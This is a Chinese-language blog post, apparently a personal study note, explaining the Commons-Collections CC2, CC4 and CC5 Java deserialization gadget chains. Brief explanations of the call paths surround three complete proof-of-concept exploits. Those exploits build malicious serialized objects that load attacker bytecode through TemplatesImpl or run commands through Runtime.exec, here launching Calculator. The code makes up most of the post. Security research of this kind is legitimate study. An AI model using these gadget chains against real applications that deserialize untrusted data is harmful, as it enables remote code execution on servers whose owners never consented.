# CommonsCollections2 4 5链详解

  
  
&lt;!--more--&gt;  
## CommonsCollections2-4-5链详解  
`Commons-Collections`版本为4.0  
### CommonsCollections4 链详解  
仍然是调用了`transform`方法，但入口点变了位置，这次利用了`TransformingComparator`类`compare()`方法中的`transform`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171808254.png)
在`PriorityQueue`类中的`readObject`方法恰好调用了`compare`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171809891.png)
跟进`heapify()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810664.png)
跟进`siftDown()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810083.png)
再跟进`siftDownUsingComparator()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810025.png)
正好在这里调用了`compare()`方法  
构造一下`poc`  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections4.Transformer;    
import org.apache.commons.collections4.comparators.TransformingComparator;    
import org.apache.commons.collections4.functors.ChainedTransformer;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InstantiateTransformer;    
    
import javax.xml.transform.Templates;    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.PriorityQueue;    
    
public class CommonsCollections4 {    
    public static void main(String[] args) throws Exception {    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
    
        Field nameField = tc.getDeclaredField(&#34;_name&#34;);    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,&#34;test&#34;);    
    
        Field bytecodesField = tc.getDeclaredField(&#34;_bytecodes&#34;);    
        bytecodesField.setAccessible(true);    
        byte[] code = Files.readAllBytes(Paths.get(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class&#34;));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField(&#34;_tfactory&#34;);    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(TrAXFilter.class),    
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})    
        };    
    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);    
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);    
        Class priorityClass = priorityQueue.getClass();    
        Field sizeField = priorityClass.getDeclaredField(&#34;size&#34;);    
        sizeField.setAccessible(true);    
        sizeField.set(priorityQueue,2);    
    
        //serialize(priorityQueue);    
        unserialize(&#34;ser.bin&#34;);    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171826539.png)  
### CommonsCollections2 链详解  
利用`InvokerTransformer`方法，来调用`newTransformer()`来加载恶意类的调用  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections4.comparators.TransformingComparator;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InstantiateTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
    
import javax.swing.text.AbstractDocument;    
import javax.xml.transform.Templates;    
import javax.xml.ws.spi.Invoker;    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.PriorityQueue;    
    
public class CommonsCollections2 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
    
        Field nameField = tc.getDeclaredField(&#34;_name&#34;);    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,&#34;test&#34;);    
    
        Field bytecodesField = tc.getDeclaredField(&#34;_bytecodes&#34;);    
        bytecodesField.setAccessible(true);    
        byte[] code = Files.readAllBytes(Paths.get(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class&#34;));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField(&#34;_tfactory&#34;);    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;newTransformer&#34;,new Class[]{},new Object[]{});    
    
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));    
    
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);    
    
        priorityQueue.add(templatesImpl);    
        priorityQueue.add(2);    
    
        Class c = transformingComparator.getClass();    
        Field transformerField = c.getDeclaredField(&#34;transformer&#34;);    
        transformerField.setAccessible(true);    
        transformerField.set(transformingComparator,invokerTransformer);    
    
//        serialize(priorityQueue);    
        unserialize(&#34;ser.bin&#34;);    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171948223.png)
### CommonsCollections5 链详解  
这里利用了`TiedMapEntry`类中的`toString()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172007422.png)
接着又去调用了`getValue()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172007376.png)
然后调用了任意类的`get()`方法，这里直接用`LazyMap`类中的`get()`方法即可  
后面的直接用 CC1 部分链  
这里的入口点`readObject()`需要选一个有`toString()`方法的，这里用`BadAttributeValueExpException`类中的`readObject()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172010602.png)
构造`poc`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.keyvalue.TiedMapEntry;    
import org.apache.commons.collections.map.LazyMap;    
import org.apache.commons.collections4.map.TransformedMap;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections5 {    
    public static void main(String[] args) throws Exception{    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}),    
                new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),    
                new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();    
        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,1);    
    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);    
        Class c = Class.forName(&#34;javax.management.BadAttributeValueExpException&#34;);    
        Field valField = c.getDeclaredField(&#34;val&#34;);    
        valField.setAccessible(true);    
        valField.set(badAttributeValueExpException,tiedMapEntry);    
    
        //serialize(badAttributeValueExpException);    
        unserialize(&#34;ser.bin&#34;);    
    
    }    
    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172022766.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/  

